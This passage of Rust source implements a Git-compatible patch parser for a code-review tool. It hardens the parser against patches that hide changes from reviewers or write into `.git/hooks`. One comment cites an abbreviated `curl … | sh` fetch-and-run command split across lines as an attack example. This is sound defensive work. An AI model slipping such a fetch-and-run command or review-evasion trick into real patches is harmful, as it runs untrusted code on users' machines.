// DDF integration: R02, R03, R04, R05, R06, R07, R44, R46. Preserve source bytes and exact original input independently of normalized display; use Git as the application oracle.
// Design/status: docs/RECOMMENDATION_INTEGRATION.md#patch-truth
// Module vault note (bidirectional): obsidian://open?vault=deep-diff-forge.vault&file=Implementation%2FModules%2Fdeep-diff-forge-patch--parser
use crate::{DEFAULT_BYTE_BUDGET, DEFAULT_LINE_BUDGET, PatchParseError};
use deep_diff_forge_core::{
    DiffStrategy, FileStatus, HunkId, PatchHunk, PatchLine, PatchLineKind, PatchTwin,
    PlannerDecision, ReviewFile,
};

/// Extended-header line prefixes recorded as file metadata.
const META_PREFIXES: &[&str] = &[
    "old mode ",
    "new mode ",
    "new file mode ",
    "deleted file mode ",
    "index ",
    "similarity index ",
    "dissimilarity index ",
    "copy from ",
    "copy to ",
    "GIT binary patch",
    "Binary files ",
];

/// The extended headers that carry a file mode.
const MODE_PREFIXES: &[&str] = &[
    "old mode ",
    "new mode ",
    "new file mode ",
    "deleted file mode ",
];

/// A Git file mode: one to six octal digits, as Git writes them. `git apply` refuses a mode
/// that is not octal ("invalid mode"); the oddities it tolerates (a sign, a trailing space)
/// are refused too, since no Git writes them.
pub(crate) fn parse_mode(mode: &str) -> Option<u32> {
    (!mode.is_empty() && mode.len() <= 6 && mode.bytes().all(|b| (b'0'..=b'7').contains(&b)))
        .then(|| u32::from_str_radix(mode, 8).ok())
        .flatten()
}

/// The object type bits of a mode: a regular file, a symlink or a submodule.
const fn object_type(mode: u32) -> u32 {
    mode & 0o170_000
}

/// A path `git apply` refuses to write ("invalid path"): absolute, empty, or with a `.`, `..`
/// or `.git` component. A rename or copy names one only to escape the tree or to reach
/// `.git/hooks` (bug hunt 2026-10-28, H1-09).
fn git_refuses_path(path: &str) -> bool {
    path.is_empty()
        || path.starts_with('/')
        || path
            .split('/')
            .any(|c| c == "." || c == ".." || c.eq_ignore_ascii_case(".git"))
}

/// Options controlling patch parsing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ParseOptions {
    /// Maximum accepted input size in bytes (trust-boundary guard).
    pub byte_budget: usize,
}

impl Default for ParseOptions {
    fn default() -> Self {
        Self {
            byte_budget: DEFAULT_BYTE_BUDGET,
        }
    }
}

/// Parse a unified or Git-format patch with default options.
///
/// Produces one [`ReviewFile`] per file section, each carrying an apply-able
/// [`PatchTwin`]. Semantic analysis is never attempted here: the patch layer is
/// upstream of every enrichment layer.
///
/// # Errors
///
/// Returns [`PatchParseError`] when the input exceeds the byte budget, contains
/// a malformed hunk header, or places a diff body line outside any hunk.
pub fn parse(input: &str) -> Result<Vec<ReviewFile>, PatchParseError> {
    parse_with(input, ParseOptions::default())
}

/// Parse a unified or Git-format patch with explicit options.
///
/// # Errors
///
/// Returns [`PatchParseError`] when the input exceeds the byte budget, contains
/// a malformed hunk header, or places a diff body line outside any hunk.
pub fn parse_with(input: &str, options: ParseOptions) -> Result<Vec<ReviewFile>, PatchParseError> {
    parse_lines(input, input.len(), &[], options)
}

/// Parse patch bytes that may not be UTF-8 (see [`crate::decode`]). Each file that holds a lossily
/// decoded line reports it in `PatchTwin::lossy_lines`; the byte budget applies to the original
/// bytes, not to the longer decoded text.
///
/// # Errors
///
/// As [`parse_with`].
pub fn parse_decoded(
    decoded: &crate::DecodedPatch<'_>,
    options: ParseOptions,
) -> Result<Vec<ReviewFile>, PatchParseError> {
    parse_lines(
        decoded.text(),
        decoded.byte_len(),
        decoded.lossy_lines(),
        options,
    )
}

/// `lossy` holds the 1-based numbers of lossily decoded lines, ascending.
fn parse_lines(
    input: &str,
    byte_len: usize,
    lossy: &[usize],
    options: ParseOptions,
) -> Result<Vec<ReviewFile>, PatchParseError> {
    if byte_len > options.byte_budget {
        return Err(PatchParseError::BudgetExceeded {
            limit_bytes: options.byte_budget,
            actual_bytes: byte_len,
        });
    }

    let mut parser = Parser::default();
    let mut lossy = lossy.iter().peekable();
    let unterminated_last =
        (!input.is_empty() && !input.ends_with('\n')).then(|| input.split_terminator('\n').count());
    for (index, line) in input.split_terminator('\n').enumerate() {
        if index >= DEFAULT_LINE_BUDGET {
            return Err(PatchParseError::LineBudgetExceeded {
                limit_lines: DEFAULT_LINE_BUDGET,
                actual_lines: index + 1,
            });
        }
        parser.feed(line, index + 1)?;
        // Git refuses a patch whose last hunk line has no line feed as corrupt; reading it as
        // complete would review a line Git will not apply (bug hunt 2026-10-28, H1-04).
        if unterminated_last == Some(index + 1) && parser.can_mark_eof {
            return Err(PatchParseError::UnterminatedLine {
                line_number: index + 1,
            });
        }
        if lossy.next_if_eq(&&(index + 1)).is_some() {
            // `can_mark_eof` is set exactly when this line was a hunk body line.
            if parser.can_mark_eof
                && let Some(body) = parser.last_body_line()
            {
                body.lossy = true;
            }
            if let Some(file) = parser.file.as_mut() {
                file.lossy_lines = file.lossy_lines.saturating_add(1);
            }
        }
    }
    parser.finish()
}

/// Working accumulator for one file section.
#[derive(Default)]
#[expect(
    clippy::struct_excessive_bools,
    reason = "independent facts about one section's headers, each read by a different rule"
)]
struct FileBuf {
    git_old: Option<String>,
    git_new: Option<String>,
    old_raw: Option<String>,
    new_raw: Option<String>,
    rename_from: Option<String>,
    rename_to: Option<String>,
    metadata: Vec<String>,
    binary_body: Vec<String>,
    /// After `GIT binary patch`: only lines of the body grammar are admitted (see
    /// [`is_binary_body_line`]) until the next `diff --git`; any other line is refused.
    in_binary_body: bool,
    hunks: Vec<PatchHunk>,
    lossy_lines: u32,
    /// A `---` arrived and its `+++` must be the very next line.
    awaiting_new_header: bool,
    /// The file's `---`/`+++` or first hunk arrived: extended headers are no longer admitted.
    past_headers: bool,
    /// The line number of a `\ No newline at end of file` marker that ended the old side, and
    /// of one that ended the new side: no later body line may add to a side its marker ended.
    eof_old: Option<usize>,
    eof_new: Option<usize>,
    /// The section began with `diff --git`: its `---`/`+++` are read as `git apply` reads a Git
    /// diff's (`find_name`), not a traditional diff's (`find_name_traditional`).
    git: bool,
    /// Header paths keep their first component: Git guessed `-p0` (see [`Parser::p0`]).
    p0: bool,
    /// A traditional diff's `---` carries an epoch timestamp, so Git creates the file.
    old_epoch: bool,
    /// A traditional diff's path, chosen as `git apply` chooses it once both headers arrived.
    traditional_path: Option<String>,
    /// The line that began the section, where a section that names no path is refused.
    first_line: usize,
}

/// Working accumulator for one hunk.
struct HunkBuf {
    id: HunkId,
    section: Option<String>,
    old_start: u32,
    new_start: u32,
    old_line: u32,
    new_line: u32,
    rem_old: u32,
    rem_new: u32,
    lines: Vec<PatchLine>,
}

#[derive(Default)]
struct Parser {
    files: Vec<ReviewFile>,
    file: Option<FileBuf>,
    hunk: Option<HunkBuf>,
    next_hunk_id: u64,
    /// Last line number fed, so end-of-input truncation can be located.
    last_line: usize,
    can_mark_eof: bool,
    /// `git apply` without `-p` guesses `-p0` from the first traditional diff whose new name has
    /// no `/` (`guess_p_value`), and keeps it for every later file of the patch: after `--- x`,
    /// `--- .github/workflows/ci.yml` names that path, not `workflows/ci.yml`.
    p0: bool,
}

impl Parser {
    /// The most recent hunk body line of the current file: in the open hunk, or in the last
    /// closed one.
    fn last_body_line(&mut self) -> Option<&mut PatchLine> {
        let file = self.file.as_mut()?;
        self.hunk
            .as_mut()
            .and_then(|h| h.lines.last_mut())
            .or_else(|| file.hunks.last_mut().and_then(|h| h.lines.last_mut()))
    }

    fn feed(&mut self, line: &str, line_number: usize) -> Result<(), PatchParseError> {
        self.last_line = line_number;
        let can_mark_eof = std::mem::take(&mut self.can_mark_eof);
        // The "\ No newline at end of file" marker applies to the preceding
        // line and is recorded as file metadata, whether or not a hunk is still
        // open (it can arrive after the hunk's line counts are exhausted).
        if line.starts_with('\\') {
            if !can_mark_eof || line != "\\ No newline at end of file" {
                return Err(PatchParseError::InvalidEofMarker { line_number });
            }
            let kind = self.last_body_line().map(|previous| {
                previous.no_newline = true;
                previous.kind
            });
            if let Some(file) = self.file.as_mut() {
                file.metadata.push(line.to_string());
                if kind != Some(PatchLineKind::Added) {
                    file.eof_old = Some(line_number);
                }
                if kind != Some(PatchLineKind::Removed) {
                    file.eof_new = Some(line_number);
                }
            }
            return Ok(());
        }
        // While a hunk is open and not yet exhausted, body lines belong to it.
        if let Some(hunk) = self.hunk.as_mut() {
            if (hunk.rem_old > 0 || hunk.rem_new > 0)
                && let Some(consumed) = hunk.consume_body(line, line_number)
            {
                consumed?;
                if let Some(marker) = self.file.as_ref().and_then(|f| f.ended_side(line)) {
                    return Err(PatchParseError::InvalidEofMarker {
                        line_number: marker,
                    });
                }
                self.can_mark_eof = true;
                if hunk.rem_old == 0 && hunk.rem_new == 0 {
                    // Counts satisfied: a clean close (cannot truncate).
                    self.close_hunk(line_number)?;
                }
                return Ok(());
            }
            // A non-body line arrived while the hunk still expects content:
            // closing here rejects the truncated hunk.
            self.close_hunk(line_number)?;
        }
        self.dispatch_non_body(line, line_number)
    }

    fn dispatch_non_body(&mut self, line: &str, line_number: usize) -> Result<(), PatchParseError> {
        if line.starts_with("diff --cc ") || line.starts_with("diff --combined ") {
            return Err(PatchParseError::UnsupportedFormat { line_number });
        }
        if let Some(rest) = line.strip_prefix("diff --git ") {
            return self.start_git_file(rest, line_number);
        }
        // After `GIT binary patch`, git's format allows only body lines until the next
        // `diff --git`; anything else is refused. Before, every later line went into the body, so
        // a text change after a binary section was hidden from the review yet applied by
        // `git apply` (and the per-line scan of all metadata was quadratic). Ending the body at
        // the first other line instead let a later metadata line reorder on rendering (fuzz).
        if let Some(file) = self.file.as_mut()
            && file.in_binary_body
        {
            if is_binary_body_line(line) {
                file.binary_body.push(line.to_string());
                return Ok(());
            }
            return Err(PatchParseError::UnsupportedFormat { line_number });
        }
        // Git drops the carriage returns that end a header line (a patch saved with CRLF line
        // ends): `--- /dev/null\r` is `/dev/null` and `+++ b/x\r` names `x`. Kept, the CR made
        // an added file `modified` under a path ending in CR, so its new-file and path signals
        // were lost (bug hunt 2026-11-01). Inside an unquoted `---`/`+++` name a CR ends the name,
        // as in Git (see [`header_name`]); a quoted one (`"x\r"`) is part of it. Body lines keep
        // theirs: there it is content. The `diff --git` line, matched above, keeps its CR too.
        let had_cr = line.ends_with('\r');
        let line = line.trim_end_matches('\r');
        // A `---` is a header only with its `+++` right after it; git ignores either alone, so
        // taking one as a header changed the reviewed path or made a phantom file (bug hunt
        // 2026-10-28, H1-01).
        if self.file.as_ref().is_some_and(|f| f.awaiting_new_header) && !line.starts_with("+++ ") {
            return Err(PatchParseError::MisplacedHeader { line_number });
        }
        if let Some(rest) = line.strip_prefix("--- ") {
            return self.on_old_header(rest, had_cr, line_number);
        }
        if let Some(rest) = line.strip_prefix("+++ ") {
            return self.on_new_header(rest, had_cr, line_number);
        }
        if line.starts_with("@@") {
            return self.open_hunk(line, line_number);
        }
        if self.try_metadata(line, line_number)? {
            return Ok(());
        }
        // `git format-patch` writes a bare `---` before the diffstat and a `-- ` signature after
        // the last hunk; git ignores both outside a hunk, so they are mail framing, not body
        // lines (bug hunt 2026-10-28, H1-07). Only these exact lines: anything else stays a
        // stray body marker.
        if line == "---" || line == "-- " {
            return Ok(());
        }
        // A stray body marker outside any hunk is malformed; quiet preamble
        // (commit messages, diffstats, blank lines) is ignored.
        if line.starts_with('+') || line.starts_with('-') {
            return Err(PatchParseError::BodyLineOutsideHunk {
                line_number,
                text: line.to_string(),
            });
        }
        Ok(())
    }

    fn start_git_file(&mut self, rest: &str, line_number: usize) -> Result<(), PatchParseError> {
        self.close_hunk(line_number)?;
        self.flush_file()?;
        let mut file = FileBuf {
            git: true,
            p0: self.p0,
            first_line: line_number,
            ..FileBuf::default()
        };
        // `diff --git X/NAME Y/NAME` is split as `git apply` splits it, where both halves name
        // one path once their first components go (see [`same_name_halves`]), whatever the
        // prefixes are and whatever the name holds: `a/x b/y b/x b/y` is `x b/y`. Splitting on
        // the rightmost ` b/` first made that `y`, so a mode change was reviewed on `y` while Git
        // changed `x b/y` (bug hunt 2026-11-01). Halves that name different paths are not one
        // file to Git, which takes the names from `---`/`+++` or the rename headers, and those
        // set the reviewed path below; with neither (a mode change of two files compared with
        // `git diff --no-index`) the line falls back to the rightmost ` b/`. With no split at
        // all the section names no path, and `flush_file` refuses it.
        if rest.starts_with('"') {
            let (old, remaining) = super::paths::decode_quoted_prefix(rest)
                .ok_or(PatchParseError::InvalidPath { line_number })?;
            let new = super::paths::decode_path(remaining.trim_start())
                .ok_or(PatchParseError::InvalidPath { line_number })?;
            file.git_old = Some(p_name(&old, self.p0));
            file.git_new = Some(p_name(&new, self.p0));
        } else if let Some(name) = same_name_halves(rest, self.p0) {
            file.git_old = Some(name.clone());
            file.git_new = Some(name);
        } else if let Some(sep) = rest.rfind(" \"b/").or_else(|| rest.rfind(" b/")) {
            file.git_old = Some(p_name(
                &super::paths::decode_path(&rest[..sep])
                    .ok_or(PatchParseError::InvalidPath { line_number })?,
                self.p0,
            ));
            file.git_new = Some(p_name(
                &super::paths::decode_path(&rest[sep + 1..])
                    .ok_or(PatchParseError::InvalidPath { line_number })?,
                self.p0,
            ));
        }
        self.file = Some(file);
        Ok(())
    }

    fn on_old_header(
        &mut self,
        rest: &str,
        had_cr: bool,
        line_number: usize,
    ) -> Result<(), PatchParseError> {
        self.close_hunk(line_number)?;
        let needs_new = self
            .file
            .as_ref()
            .is_some_and(|f| f.new_raw.is_some() || !f.hunks.is_empty());
        if self.file.is_none() || needs_new {
            self.flush_file()?;
            // A traditional section's `-p0` is settled at its `+++` (see `on_new_header`).
            self.file = Some(FileBuf {
                first_line: line_number,
                ..FileBuf::default()
            });
        }
        if let Some(file) = self.file.as_mut() {
            if file.old_raw.is_some() {
                return Err(PatchParseError::MisplacedHeader { line_number });
            }
            let traditional = !file.git;
            file.old_raw = Some(
                header_name(rest, traditional && !had_cr)
                    .ok_or(PatchParseError::InvalidPath { line_number })?,
            );
            file.old_epoch = traditional && !had_cr && has_epoch_timestamp(rest);
            file.awaiting_new_header = true;
            file.past_headers = true;
        }
        Ok(())
    }

    fn on_new_header(
        &mut self,
        rest: &str,
        had_cr: bool,
        line_number: usize,
    ) -> Result<(), PatchParseError> {
        // A `+++` belongs right after its `---`: alone, or a second one, git ignores it, and
        // taking it changed the reviewed path (bug hunt 2026-10-28, H1-01 and H1-04).
        if !self.file.as_ref().is_some_and(|f| f.awaiting_new_header) {
            return Err(PatchParseError::MisplacedHeader { line_number });
        }
        if let Some(file) = self.file.as_mut() {
            file.awaiting_new_header = false;
            let traditional = !file.git;
            let name = header_name(rest, traditional && !had_cr)
                .ok_or(PatchParseError::InvalidPath { line_number })?;
            if traditional {
                // `guess_p_value`: a new name with no `/` sets `-p0` for this file and every
                // later one.
                self.p0 |= name != "/dev/null" && !name.is_empty() && !name.contains('/');
                file.p0 = self.p0;
            }
            file.new_raw = Some(name);
            if traditional {
                file.name_traditional(!had_cr && has_epoch_timestamp(rest), rest.starts_with('"'));
            }
        }
        Ok(())
    }

    fn open_hunk(&mut self, line: &str, line_number: usize) -> Result<(), PatchParseError> {
        let header =
            parse_hunk_header(line).ok_or_else(|| PatchParseError::MalformedHunkHeader {
                line_number,
                text: line.to_string(),
            })?;
        if self.file.is_none() {
            // A hunk with no headers names no path, so `flush_file` refuses it here.
            self.file = Some(FileBuf {
                first_line: line_number,
                ..FileBuf::default()
            });
        }
        // A hunk ends the file's headers, even when no `---`/`+++` came first (fuzz).
        if let Some(file) = self.file.as_mut() {
            file.past_headers = true;
        }
        let id = HunkId(self.next_hunk_id);
        self.next_hunk_id += 1;
        self.hunk = Some(HunkBuf {
            id,
            section: header.section,
            old_start: header.old_start,
            new_start: header.new_start,
            old_line: header.old_start,
            new_line: header.new_start,
            rem_old: header.old_count,
            rem_new: header.new_count,
            lines: Vec::new(),
        });
        Ok(())
    }

    fn try_metadata(&mut self, line: &str, line_number: usize) -> Result<bool, PatchParseError> {
        let Some(file) = self.file.as_mut() else {
            return Ok(false);
        };
        // Extended headers come before the file's `---`/`+++` and hunks; after them git ignores
        // the line, so taking it changed the reviewed status, path or mode (bug hunt
        // 2026-10-28, H1-01).
        let extended = META_PREFIXES.iter().any(|p| line.starts_with(p))
            || ["rename from ", "rename to ", "copy from ", "copy to "]
                .iter()
                .any(|p| line.starts_with(p));
        if extended && file.past_headers {
            return Err(PatchParseError::MisplacedHeader { line_number });
        }
        // `git apply` also reads `rename old`/`rename new` as `rename from`/`rename to`, which no
        // current Git writes. Ignored, they let a rename be reviewed as `modified <new>`, hiding
        // that the old path goes (bug hunt 2026-11-01); they are refused, not translated.
        if !file.past_headers
            && (line.starts_with("rename old ") || line.starts_with("rename new "))
        {
            return Err(PatchParseError::UnsupportedFormat { line_number });
        }
        // Git squashes the repeated slashes of a moved path (`find_name`), so `rename to
        // .github//workflows/ci.yml` writes `.github/workflows/ci.yml`.
        let moved_path = |path: &str| {
            super::paths::decode_path(path)
                .filter(|p| !git_refuses_path(p))
                .map(|p| squash_slashes(&p))
                .ok_or(PatchParseError::InvalidPath { line_number })
        };
        if let Some(path) = line.strip_prefix("rename from ") {
            file.rename_from = Some(moved_path(path)?);
            file.metadata.push(line.to_string());
            return Ok(true);
        }
        if let Some(path) = line.strip_prefix("rename to ") {
            file.rename_to = Some(moved_path(path)?);
            file.metadata.push(line.to_string());
            return Ok(true);
        }
        if let Some(path) = line
            .strip_prefix("copy from ")
            .or_else(|| line.strip_prefix("copy to "))
        {
            moved_path(path)?;
        }
        if MODE_PREFIXES
            .iter()
            .filter_map(|p| line.strip_prefix(p))
            .any(|mode| parse_mode(mode).is_none())
        {
            return Err(PatchParseError::InvalidMode { line_number });
        }
        if META_PREFIXES.iter().any(|p| line.starts_with(p)) {
            file.in_binary_body |= line == "GIT binary patch";
            file.metadata.push(line.to_string());
            return Ok(true);
        }
        Ok(false)
    }

    /// Close the open hunk, if any. A hunk whose declared old/new counts are not
    /// yet satisfied is a truncated hunk and is rejected — this is what keeps a
    /// hunk's `@@ -a,b +c,d @@` contract load-bearing for patch truth.
    fn close_hunk(&mut self, line_number: usize) -> Result<(), PatchParseError> {
        if let Some(hunk) = self.hunk.take() {
            if hunk.rem_old != 0 || hunk.rem_new != 0 {
                return Err(PatchParseError::TruncatedHunk {
                    line_number,
                    remaining_old: hunk.rem_old,
                    remaining_new: hunk.rem_new,
                });
            }
            if let Some(file) = self.file.as_mut() {
                file.hunks.push(PatchHunk {
                    id: hunk.id,
                    old_start: Some(hunk.old_start),
                    new_start: Some(hunk.new_start),
                    section: hunk.section,
                    lines: hunk.lines,
                });
            }
        }
        Ok(())
    }

    fn flush_file(&mut self) -> Result<(), PatchParseError> {
        if let Some(file) = self.file.take() {
            if file.awaiting_new_header {
                return Err(PatchParseError::MisplacedHeader {
                    line_number: self.last_line,
                });
            }
            // `new file` reads from /dev/null and `deleted file` writes to it; git refuses the
            // contradiction ("expected /dev/null"), and rendering would have rewritten the header.
            let says = |prefix: &str| file.metadata.iter().any(|m| m.starts_with(prefix));
            let moved = ["rename from ", "rename to ", "copy from ", "copy to "]
                .iter()
                .any(|p| says(p));
            if (says("new file mode ") && says("deleted file mode "))
                || ((says("new file mode ") || says("deleted file mode ")) && moved)
                // A new file has no old lines and a deleted one no new lines; git refuses both
                // ("new file depends on old contents"), and the model could not render them.
                || (says("new file mode ")
                    && file.hunks.iter().flat_map(|h| &h.lines).any(|l| l.kind != PatchLineKind::Added))
                || (says("deleted file mode ")
                    && file.hunks.iter().flat_map(|h| &h.lines).any(|l| l.kind != PatchLineKind::Removed))
                // With hunks, the file headers are written from the status, so a new or deleted
                // file whose status is anything else (binary, or a `/dev/null` on the wrong side)
                // cannot be represented. Text hunks beside binary markers on any other file are
                // the `UnsupportedFormat` below.
                || (!file.hunks.is_empty()
                    && ((says("new file mode ") && file.resolve_status() != FileStatus::Added)
                        || (says("deleted file mode ")
                            && file.resolve_status() != FileStatus::Deleted)))
                || (says("new file mode ")
                    && file.old_raw.as_deref().is_some_and(|p| p != "/dev/null"))
                || (says("deleted file mode ")
                    && file.new_raw.as_deref().is_some_and(|p| p != "/dev/null"))
            {
                return Err(PatchParseError::InconsistentHeader {
                    line_number: self.last_line,
                });
            }
            if !file.hunks.is_empty()
                && file
                    .metadata
                    .iter()
                    .any(|m| m == "GIT binary patch" || m.starts_with("Binary files "))
            {
                return Err(PatchParseError::UnsupportedFormat {
                    line_number: self.last_line,
                });
            }
            // Contradictory rename/copy labels cannot be faithfully reconstructed.
            // Reject them rather than choosing one path and silently changing truth.
            let mut declared_old: Option<String> = None;
            for meta in &file.metadata {
                if let Some(from) = meta
                    .strip_prefix("rename from ")
                    .or_else(|| meta.strip_prefix("copy from "))
                {
                    let from = super::paths::decode_path(from)
                        .map(|from| squash_slashes(&from))
                        .ok_or(PatchParseError::InvalidPath {
                            line_number: self.last_line,
                        })?;
                    if declared_old
                        .as_ref()
                        .is_some_and(|previous| previous != &from)
                    {
                        return Err(PatchParseError::InvalidPath {
                            line_number: self.last_line,
                        });
                    }
                    declared_old = Some(from.clone());
                    if file
                        .old_raw
                        .as_deref()
                        .is_some_and(|old| p_name(old, file.p0) != from)
                        || file.new_raw.as_deref() == Some("/dev/null")
                        || file.metadata.iter().any(|m| {
                            m.starts_with("new file mode ") || m.starts_with("deleted file mode ")
                        })
                    {
                        return Err(PatchParseError::InvalidPath {
                            line_number: self.last_line,
                        });
                    }
                }
            }
            // Git refuses a section it can name no path for ("git diff header lacks filename
            // information"): a `diff --git i/x w/y` mode change was reviewed as a file with an
            // empty path (bug hunt 2026-11-01).
            if file.resolve_path().is_empty() {
                return Err(PatchParseError::InvalidPath {
                    line_number: file.first_line,
                });
            }
            self.files.push(file.into_review_file());
        }
        Ok(())
    }

    fn finish(mut self) -> Result<Vec<ReviewFile>, PatchParseError> {
        // End of input: any still-open hunk must have satisfied its counts.
        self.close_hunk(self.last_line)?;
        self.flush_file()?;
        Ok(self.files)
    }
}

impl HunkBuf {
    /// Try to consume `line` as a hunk body line. Returns `None` when the line
    /// is not a body line (so the caller closes the hunk and re-dispatches), and
    /// `Some(Err(..))` when the line would exceed the side count the header
    /// declared — a hunk that over-fills its `@@ -a,b +c,d @@` contract is
    /// rejected, just as a truncated one is.
    fn consume_body(
        &mut self,
        line: &str,
        line_number: usize,
    ) -> Option<Result<(), PatchParseError>> {
        let marker = line.chars().next();
        let text = line.get(1..).unwrap_or("").to_string();
        let mismatch = || PatchParseError::HunkLineCountMismatch {
            line_number,
            text: line.to_string(),
        };
        match marker {
            // A leading space is a context line; a truly-empty line inside an
            // unexhausted hunk is a blank context line emitted without the
            // conventional leading space (lenient-tool tolerance). Context
            // consumes one slot from BOTH sides, so both must remain.
            Some(' ') | None => {
                if self.rem_old == 0 || self.rem_new == 0 {
                    return Some(Err(mismatch()));
                }
                self.lines.push(PatchLine {
                    no_newline: false,
                    lossy: false,
                    kind: PatchLineKind::Context,
                    old_line: Some(self.old_line),
                    new_line: Some(self.new_line),
                    text,
                });
                self.old_line = self.old_line.saturating_add(1);
                self.new_line = self.new_line.saturating_add(1);
                self.rem_old -= 1;
                self.rem_new -= 1;
                Some(Ok(()))
            }
            Some('+') => {
                if self.rem_new == 0 {
                    return Some(Err(mismatch()));
                }
                self.lines.push(PatchLine {
                    no_newline: false,
                    lossy: false,
                    kind: PatchLineKind::Added,
                    old_line: None,
                    new_line: Some(self.new_line),
                    text,
                });
                self.new_line = self.new_line.saturating_add(1);
                self.rem_new -= 1;
                Some(Ok(()))
            }
            Some('-') => {
                if self.rem_old == 0 {
                    return Some(Err(mismatch()));
                }
                self.lines.push(PatchLine {
                    no_newline: false,
                    lossy: false,
                    kind: PatchLineKind::Removed,
                    old_line: Some(self.old_line),
                    new_line: None,
                    text,
                });
                self.old_line = self.old_line.saturating_add(1);
                self.rem_old -= 1;
                Some(Ok(()))
            }
            _ => None,
        }
    }
}

impl FileBuf {
    /// The marker that ended the side the body line `line` adds to, if one did. The marker drops
    /// the newline of the line before it, so Git joins the next line of that side onto it: `+cu`,
    /// a marker, then `+rl … | sh` was reviewed as two lines and applied as one `curl … | sh`
    /// (bug hunt 2026-11-01). A marker must end its side of the file.
    fn ended_side(&self, line: &str) -> Option<usize> {
        match line.as_bytes().first() {
            Some(b'-') => self.eof_old,
            Some(b'+') => self.eof_new,
            // A context line, with or without its leading space, is on both sides.
            _ => self.eof_old.or(self.eof_new),
        }
    }

    /// Name a traditional diff (no `diff --git`) as `parse_traditional_patch` names it. With
    /// neither side `/dev/null`, the new name gives the path unless the old name is a strict
    /// prefix of it (`find_name_common` prefers the shorter name, so `--- a/build.rs` and
    /// `+++ b/build.rs.new` change `build.rs`), and an epoch timestamp on one side makes the
    /// file created or deleted (`has_epoch_timestamp`, the `diff -N` form). Reviewing the new
    /// name and `modified` hid the build script and the creation (bug hunt 2026-11-01). A side
    /// that names nothing after its first component leaves the choice to [`Self::resolve_path`].
    fn name_traditional(&mut self, new_epoch: bool, new_quoted: bool) {
        let (Some(old), Some(new)) = (self.old_raw.as_deref(), self.new_raw.as_deref()) else {
            return;
        };
        let side = |path: &str| strip_p(path, self.p0).map(squash_slashes);
        self.traditional_path = if old == "/dev/null" {
            side(new)
        } else if new == "/dev/null" {
            side(old)
        } else {
            let first = side(old);
            let name = match (first, strip_p(new, self.p0)) {
                // Git asks for a strict prefix; an equal name is the same choice either way.
                (Some(first), Some(second)) if !new_quoted && second.starts_with(&first) => {
                    Some(first)
                }
                (_, Some(second)) => Some(squash_slashes(second)),
                (first, None) => first,
            };
            if self.old_epoch {
                self.old_raw = Some("/dev/null".to_owned());
            } else if new_epoch {
                self.new_raw = Some("/dev/null".to_owned());
            }
            name
        };
    }

    fn into_review_file(self) -> ReviewFile {
        let status = self.resolve_status();
        let path = self.resolve_path();
        let strategy = if status == FileStatus::BinaryChanged {
            DiffStrategy::Binary
        } else {
            DiffStrategy::Line
        };
        ReviewFile {
            path,
            status,
            patch_twin: PatchTwin {
                binary_body: self.binary_body,
                hunks: self.hunks,
                metadata: self.metadata,
                lossy_lines: self.lossy_lines,
            },
            semantic_twin: None,
            planner: PlannerDecision {
                strategy,
                fallback: None,
                notes: Vec::new(),
            },
        }
    }

    fn resolve_status(&self) -> FileStatus {
        let has = |prefix: &str| self.metadata.iter().any(|m| m.starts_with(prefix));
        let old_devnull = self.old_raw.as_deref() == Some("/dev/null");
        let new_devnull = self.new_raw.as_deref() == Some("/dev/null");
        let binary = has("Binary files ") || has("GIT binary patch");
        let new_file = has("new file mode ") || old_devnull;
        let deleted = has("deleted file mode ") || new_devnull;
        let mode = |prefix: &str| {
            self.metadata
                .iter()
                .find_map(|m| m.strip_prefix(prefix))
                .and_then(parse_mode)
        };
        let mode_change = has("old mode ") || has("new mode ");
        let same_type = matches!(
            (mode("old mode "), mode("new mode ")),
            (Some(old), Some(new)) if object_type(old) == object_type(new)
        );

        if binary {
            FileStatus::BinaryChanged
        } else if self.rename_from.is_some() || self.rename_to.is_some() {
            FileStatus::Renamed
        } else if has("copy from ") || has("copy to ") {
            FileStatus::Copied
        } else if new_file {
            FileStatus::Added
        } else if deleted {
            FileStatus::Deleted
        } else if mode_change && self.hunks.is_empty() {
            if same_type {
                FileStatus::ModeChanged
            } else {
                FileStatus::TypeChanged
            }
        } else if self.hunks.is_empty()
            && self.metadata.is_empty()
            && self.old_raw.is_none()
            && self.new_raw.is_none()
            && self.git_new.is_none()
        {
            FileStatus::Unknown
        } else {
            FileStatus::Modified
        }
    }

    fn resolve_path(&self) -> String {
        if let Some(to) = self.rename_to.as_ref() {
            return to.clone();
        }
        if let Some(path) = self.traditional_path.as_ref() {
            return path.clone();
        }
        let new_side = self
            .new_raw
            .as_deref()
            .filter(|p| *p != "/dev/null")
            .map(|p| p_name(p, self.p0));
        let old_side = self
            .old_raw
            .as_deref()
            .filter(|p| *p != "/dev/null")
            .map(|p| p_name(p, self.p0));
        new_side
            .or(old_side)
            .or_else(|| self.git_new.clone())
            .or_else(|| self.git_old.clone())
            .unwrap_or_default()
    }
}

/// Parsed contents of a hunk header.
struct HunkHeader {
    old_start: u32,
    old_count: u32,
    new_start: u32,
    new_count: u32,
    section: Option<String>,
}

/// Parse `@@ -a,b +c,d @@ [optional section heading]`.
///
/// The opening `@@` is already required by the call site (line starts with `@@`).
/// This function additionally requires the mandatory closing `@@` token — a unified
/// diff hunk header without it is malformed and the patch MUST be rejected (patch
/// truth: malformed input must never silently normalise to a valid internal model).
///
/// Trailing section-heading text after the closing `@@` is allowed and ignored.
fn parse_hunk_header(line: &str) -> Option<HunkHeader> {
    let rest = line.strip_prefix("@@")?.trim_start();
    let rest = rest.strip_prefix('-')?;
    let mut parts = rest.splitn(2, ' ');
    let old = parts.next()?;
    let after = parts.next()?.trim_start();
    let new = after.strip_prefix('+')?;
    // Collect whitespace-split tokens: first is the `new[,count]` range,
    // second MUST be exactly `@@` (the mandatory closer).
    let mut tokens = new.split_whitespace();
    let new_range = tokens.next()?;
    match tokens.next() {
        Some("@@") => {}
        _ => return None,
    }
    // Any further text is the optional section heading, kept for display only.
    let (old_start, old_count) = parse_range(old)?;
    let (new_start, new_count) = parse_range(new_range)?;
    let heading = new.split_once("@@").map_or("", |(_, rest)| rest);
    let heading = heading.strip_prefix(' ').unwrap_or(heading);
    Some(HunkHeader {
        old_start,
        old_count,
        new_start,
        new_count,
        section: (!heading.is_empty()).then(|| heading.to_owned()),
    })
}

/// Parse a `start` or `start,count` range; count defaults to 1.
fn parse_range(range: &str) -> Option<(u32, u32)> {
    // Digits only: `u32::from_str` also takes a leading `+`, which git refuses (H1-04).
    let number = |text: &str| {
        (!text.is_empty() && text.bytes().all(|b| b.is_ascii_digit()))
            .then(|| text.parse::<u32>().ok())
            .flatten()
    };
    let mut nums = range.split(',');
